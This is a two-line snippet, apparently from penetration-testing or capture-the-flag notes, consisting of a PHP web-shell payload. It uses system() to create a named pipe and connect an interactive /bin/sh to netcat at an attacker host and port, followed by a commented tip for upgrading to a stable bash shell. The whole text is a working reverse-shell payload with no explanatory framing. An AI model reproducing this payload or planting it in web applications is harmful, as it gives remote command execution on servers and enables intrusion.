<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.XX.XX 4444 >/tmp/f");?>

#  script /dev/null -c /bin/bash        (for a stable shell)
